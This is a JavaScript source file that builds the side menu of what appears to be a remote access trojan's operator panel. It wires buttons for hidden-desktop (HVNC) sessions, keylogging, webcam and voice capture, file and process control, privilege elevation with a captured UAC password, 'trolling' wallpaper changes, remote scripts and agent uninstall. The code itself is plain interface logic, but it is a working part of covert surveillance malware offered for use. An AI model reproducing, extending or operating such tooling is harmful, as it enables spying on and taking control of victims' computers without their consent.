/**
 * side-panel.js — Shared side action panel for desktop viewer & remote desktop pages.
 *
 * Usage:
 *   import { initSidePanel } from "./side-panel.js";
 *   initSidePanel(clientId, document.getElementById("sidePanel"));
 */

/* ──────────────────────────────────────────────────────────── */
/*  Menu definition                                            */
/* ──────────────────────────────────────────────────────────── */

const PANEL_GROUPS = [
  {
    id: "remote-access",
    label: "Remote Access",
    icon: "fa-solid fa-plug",
    color: "#818cf8",
    items: [
      { label: "Console",          icon: "fa-solid fa-terminal",   color: "#34d399", open: "console" },
      { label: "Backstage (HVNC)", icon: "fa-solid fa-ghost",      color: "#a78bfa", open: "Backstage" },
      { label: "Voice",            icon: "fa-solid fa-headset",    color: "#2dd4bf", open: "voice" },
    ],
  },
  {
    id: "monitoring",
    label: "Monitoring",
    icon: "fa-solid fa-eye",
    color: "#22d3ee",
    items: [
      { label: "Webcam",           icon: "fa-solid fa-video",      color: "#34d399", open: "webcam" },
      { label: "Keylogger",        icon: "fa-solid fa-keyboard",   color: "#facc15", open: "keylogger" },
      { label: "Process Manager",  icon: "fa-solid fa-list-check", color: "#fb923c", open: "processes" },
    ],
  },
  {
    id: "system",
    label: "System",
    icon: "fa-solid fa-server",
    color: "#60a5fa",
    items: [
      { label: "File Browser", icon: "fa-solid fa-folder-tree", color: "#60a5fa", open: "files" },
    ],
  },
  {
    id: "trolling",
    label: "Trolling",
    emoji: "\u{1F921}",
    color: "#f472b6",
    items: [
      { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#f472b6", action: "wallpaper" },
    ],
  },
  {
    id: "agent",
    label: "Agent",
    icon: "fa-solid fa-robot",
    color: "#94a3b8",
    items: [
      { label: "Ping",           icon: "fa-solid fa-satellite-dish", color: "#94a3b8", action: "ping" },
      { label: "Reconnect",      icon: "fa-solid fa-rotate",        color: "#94a3b8", action: "reconnect" },
      { label: "Set Nickname",   icon: "fa-solid fa-signature",     color: "#94a3b8", action: "set-nickname" },
      { label: "Elevate",        icon: "fa-solid fa-arrow-up-right-dots", color: "#22c55e", action: "elevate" },
      { divider: true },
      { label: "Disconnect",     icon: "fa-solid fa-plug-circle-xmark", color: "#ef4444", action: "disconnect" },
      { label: "Uninstall",      icon: "fa-solid fa-trash",         color: "#ef4444", action: "uninstall" },
    ],
  },
];

/* ──────────────────────────────────────────────────────────── */
/*  Open-target → URL mapping                                  */
/* ──────────────────────────────────────────────────────────── */

function resolveOpenUrl(clientId, target) {
  switch (target) {
    case "console":     return `/${clientId}/console`;
    case "remotedesktop": return `/viewer?clientId=${clientId}&mode=desktop`;
    case "webcam":      return `/viewer?clientId=${clientId}&mode=webcam`;
    case "Backstage":   return `/hvnc?clientId=${clientId}`;
    case "files":       return `/${clientId}/files`;
    case "processes":   return `/${clientId}/processes`;
    case "keylogger":   return `/${clientId}/keylogger`;
    case "voice":       return `/voice?clientId=${clientId}`;
    default:            return null;
  }
}

/* ──────────────────────────────────────────────────────────── */
/*  Toast notifications                                        */
/* ──────────────────────────────────────────────────────────── */

let toastContainer = null;

function ensureToastContainer() {
  if (toastContainer) return;
  toastContainer = document.createElement("div");
  toastContainer.className = "sp-toast-container";
  document.body.appendChild(toastContainer);
}

function showToast(message, type = "info", durationMs = 4000) {
  ensureToastContainer();
  const toast = document.createElement("div");
  toast.className = `sp-toast sp-toast-${type}`;
  const iconMap = { success: "fa-circle-check", error: "fa-circle-xmark", info: "fa-circle-info" };
  toast.innerHTML = `<i class="fa-solid ${iconMap[type] || iconMap.info}"></i><span>${message}</span>`;
  toastContainer.appendChild(toast);
  requestAnimationFrame(() => toast.classList.add("sp-toast-visible"));
  setTimeout(() => {
    toast.classList.remove("sp-toast-visible");
    toast.addEventListener("transitionend", () => toast.remove(), { once: true });
    setTimeout(() => toast.remove(), 500);
  }, durationMs);
}

/* ──────────────────────────────────────────────────────────── */
/*  REST helpers                                               */
/* ──────────────────────────────────────────────────────────── */

async function sendCommand(clientId, action, payload) {
  const body = payload ? { action, ...payload } : { action };
  const res = await fetch(`/api/clients/${clientId}/command`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`Command failed: ${res.status}`);
  return res.json().catch(() => ({}));
}

async function patchClient(clientId, field, value) {
  const res = await fetch(`/api/clients/${clientId}/${field}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify({ value }),
  });
  if (!res.ok) throw new Error(`Patch failed: ${res.status}`);
  return res.json().catch(() => ({}));
}

/* ──────────────────────────────────────────────────────────── */
/*  Wallpaper upload                                           */
/* ──────────────────────────────────────────────────────────── */

const ALLOWED_EXTENSIONS = new Set(["jpg", "jpeg", "png", "bmp"]);
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

function triggerWallpaperUpload(clientId) {
  const input = document.createElement("input");
  input.type = "file";
  input.accept = ".jpg,.jpeg,.png,.bmp";
  input.style.display = "none";
  document.body.appendChild(input);

  input.addEventListener("change", () => {
    const file = input.files?.[0];
    input.remove();
    if (!file) return;

    const ext = (file.name.split(".").pop() || "").toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      showToast(`Unsupported format: .${ext} — use JPG, PNG, or BMP`, "error");
      return;
    }
    if (file.size > MAX_FILE_SIZE) {
      showToast(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 10 MB.`, "error");
      return;
    }

    uploadWallpaper(clientId, file);
  });

  input.click();
}

function uploadWallpaper(clientId, file) {
  const formData = new FormData();
  formData.append("file", file);

  const xhr = new XMLHttpRequest();

  /* -- progress toast -- */
  ensureToastContainer();
  const progressToast = document.createElement("div");
  progressToast.className = "sp-toast sp-toast-info sp-toast-visible sp-toast-progress";
  progressToast.innerHTML = `
    <i class="fa-solid fa-cloud-arrow-up"></i>
    <span class="sp-progress-label">Uploading wallpaper\u2026 0%</span>
    <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
  `;
  toastContainer.appendChild(progressToast);
  const bar = progressToast.querySelector(".sp-progress-bar");
  const label = progressToast.querySelector(".sp-progress-label");

  xhr.upload.addEventListener("progress", (e) => {
    if (!e.lengthComputable) return;
    const pct = Math.round((e.loaded / e.total) * 100);
    bar.style.width = pct + "%";
    label.textContent = `Uploading wallpaper\u2026 ${pct}%`;
  });

  xhr.addEventListener("load", () => {
    progressToast.remove();
    if (xhr.status >= 200 && xhr.status < 300) {
      try {
        const res = JSON.parse(xhr.responseText);
        if (res.ok) {
          showToast("Wallpaper changed successfully!", "success");
        } else {
          showToast(res.message || "Wallpaper change failed", "error", 6000);
        }
      } catch {
        showToast("Wallpaper changed!", "success");
      }
    } else {
      let msg = "Upload failed";
      try { msg = JSON.parse(xhr.responseText).message || msg; } catch {}
      showToast(msg, "error", 6000);
    }
  });

  xhr.addEventListener("error", () => {
    progressToast.remove();
    showToast("Network error during upload", "error");
  });

  xhr.addEventListener("abort", () => {
    progressToast.remove();
    showToast("Upload cancelled", "info");
  });

  xhr.open("POST", `/api/clients/${clientId}/wallpaper`);
  xhr.withCredentials = true;
  xhr.send(formData);
}

/* ──────────────────────────────────────────────────────────── */
/*  Action handler                                             */
/* ──────────────────────────────────────────────────────────── */

async function handleAction(clientId, action) {
  try {
    switch (action) {
      case "ping":
        await sendCommand(clientId, "ping");
        showToast("Ping sent", "success");
        break;

      case "reconnect":
        await sendCommand(clientId, "reconnect");
        showToast("Reconnect signal sent", "success");
        break;

      case "disconnect": {
        if (!confirm("Disconnect this client?")) return;
        await sendCommand(clientId, "disconnect");
        showToast("Client disconnected", "success");
        break;
      }

      case "uninstall": {
        if (!confirm("Uninstall the agent from this client? This cannot be undone.")) return;
        await sendCommand(clientId, "uninstall");
        showToast("Uninstall command sent", "success");
        break;
      }

      case "elevate": {
        const password = prompt("UAC password (leave blank for none):");
        if (password === null) return;
        await sendCommand(clientId, "elevate", { password });
        showToast("Elevate command sent", "success");
        break;
      }

      case "set-nickname": {
        const nickname = prompt("Enter new nickname (blank to clear):");
        if (nickname === null) return;
        await patchClient(clientId, "nickname", nickname);
        showToast(nickname ? `Nickname set to "${nickname}"` : "Nickname cleared", "success");
        break;
      }

      case "wallpaper":
        triggerWallpaperUpload(clientId);
        break;

      default:
        showToast(`Unknown action: ${action}`, "error");
    }
  } catch (err) {
    showToast(err.message || "Action failed", "error");
  }
}

/* ──────────────────────────────────────────────────────────── */
/*  Dynamic sections (scripts & plugins)                       */
/* ──────────────────────────────────────────────────────────── */

async function loadScripts() {
  try {
    const res = await fetch("/api/saved-scripts", { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.scripts || [];
  } catch {
    return [];
  }
}

async function loadPlugins(clientId) {
  try {
    const res = await fetch(`/api/clients/${clientId}/plugins`, { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.plugins || [];
  } catch {
    return [];
  }
}

/* ──────────────────────────────────────────────────────────── */
/*  DOM builder                                                */
/* ──────────────────────────────────────────────────────────── */

function buildPanel(clientId) {
  const panel = document.createElement("div");
  panel.className = "sp-inner";

  /* ---- Static groups ---- */
  for (const group of PANEL_GROUPS) {
    const section = document.createElement("div");
    section.className = "sp-group";
    section.dataset.group = group.id;

    /* Toggle header */
    const toggle = document.createElement("button");
    toggle.className = "sp-group-toggle";
    toggle.type = "button";
    if (group.emoji) {
      toggle.innerHTML = `<span class="sp-group-emoji">${group.emoji}</span><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    } else {
      toggle.innerHTML = `<i class="${group.icon} sp-group-icon" style="color:${group.color}"></i><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    }
    toggle.addEventListener("click", () => section.classList.toggle("is-open"));
    section.appendChild(toggle);

    /* Items container */
    const items = document.createElement("div");
    items.className = "sp-group-items";

    for (const item of group.items) {
      if (item.divider) {
        const hr = document.createElement("hr");
        hr.className = "sp-divider";
        items.appendChild(hr);
        continue;
      }

      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="${item.icon}" style="color:${item.color}"></i><span>${item.label}</span>`;

      if (item.open) {
        btn.addEventListener("click", () => {
          const url = resolveOpenUrl(clientId, item.open);
          if (url) window.open(url, "_blank");
        });
      } else if (item.action) {
        btn.addEventListener("click", () => handleAction(clientId, item.action));
      }

      items.appendChild(btn);
    }

    section.appendChild(items);
    panel.appendChild(section);
  }

  /* ---- Dynamic: Run Script ---- */
  const scriptSection = document.createElement("div");
  scriptSection.className = "sp-group sp-dynamic-section";
  scriptSection.dataset.group = "scripts";
  scriptSection.style.display = "none";
  scriptSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-code sp-group-icon" style="color:#a78bfa"></i>
      <span class="sp-group-label">Run Script</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-script-items"></div>
  `;
  scriptSection.querySelector(".sp-group-toggle").addEventListener("click", () => scriptSection.classList.toggle("is-open"));
  panel.appendChild(scriptSection);

  /* ---- Dynamic: Plugins ---- */
  const pluginSection = document.createElement("div");
  pluginSection.className = "sp-group sp-dynamic-section";
  pluginSection.dataset.group = "plugins";
  pluginSection.style.display = "none";
  pluginSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-puzzle-piece sp-group-icon" style="color:#fb923c"></i>
      <span class="sp-group-label">Plugins</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-plugin-items"></div>
  `;
  pluginSection.querySelector(".sp-group-toggle").addEventListener("click", () => pluginSection.classList.toggle("is-open"));
  panel.appendChild(pluginSection);

  /* ---- Populate dynamic sections ---- */
  loadScripts().then((scripts) => {
    if (!scripts.length) return;
    scriptSection.style.display = "";
    const container = scriptSection.querySelector("#sp-script-items");
    for (const script of scripts) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-scroll" style="color:#c4b5fd"></i><span>${escapeHtml(script.name || script.title || "Script")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/scripts?clientId=${clientId}&scriptId=${script.id}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  loadPlugins(clientId).then((plugins) => {
    if (!plugins.length) return;
    pluginSection.style.display = "";
    const container = pluginSection.querySelector("#sp-plugin-items");
    for (const plugin of plugins) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-plug" style="color:#fdba74"></i><span>${escapeHtml(plugin.name || "Plugin")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/plugins/${plugin.id}?clientId=${clientId}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  return panel;
}

function escapeHtml(str) {
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}

/* ──────────────────────────────────────────────────────────── */
/*  Public init                                                */
/* ──────────────────────────────────────────────────────────── */

export function initSidePanel(clientId, containerEl) {
  if (!clientId || !containerEl) return;
  containerEl.appendChild(buildPanel(clientId));
}
